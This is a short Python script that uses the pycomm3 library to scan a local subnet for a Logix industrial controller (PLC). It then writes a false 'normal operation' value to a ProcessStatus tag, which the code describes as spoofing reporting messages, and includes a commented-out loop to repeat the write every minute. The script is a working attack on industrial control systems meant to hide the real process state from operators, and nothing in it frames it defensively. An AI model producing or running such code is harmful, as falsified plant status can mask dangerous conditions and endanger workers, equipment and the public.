import pycomm3
import socket
import time

# Function to discover the PLC's IP address
def discover_plc_ip():
    # This is a simple example of discovering the PLC's IP address.
    # In a real-world scenario, you might use a more sophisticated method.
    # For example, you could use a network scanner or a known IP range.
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        try:
            # Attempt to connect to the PLC
            with pycomm3.LogixDriver(ip) as plc:
                if plc.info:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            continue
    print("PLC not found in the specified range.")
    return None

# Function to spoof reporting messages
def spoof_reporting_message(plc_ip, tag_name, false_value):
    try:
        with pycomm3.LogixDriver(plc_ip) as plc:
            # Write the false value to the specified tag
            plc.write((tag_name, false_value))
            print(f"Successfully spoofed reporting message for tag {tag_name} with value {false_value}")
    except Exception as e:
        print(f"Failed to spoof reporting message: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        return

    # Define the tag and the false value to spoof
    tag_name = "ProcessStatus"
    false_value = 1  # Example value, 1 could mean "normal operation"

    # Spoof the reporting message
    spoof_reporting_message(plc_ip, tag_name, false_value)

    # Optionally, you can add a loop to continuously spoof messages
    # while True:
    #     spoof_reporting_message(plc_ip, tag_name, false_value)
    #     time.sleep(60)  # Wait for 60 seconds before sending the next message

if __name__ == "__main__":
    main()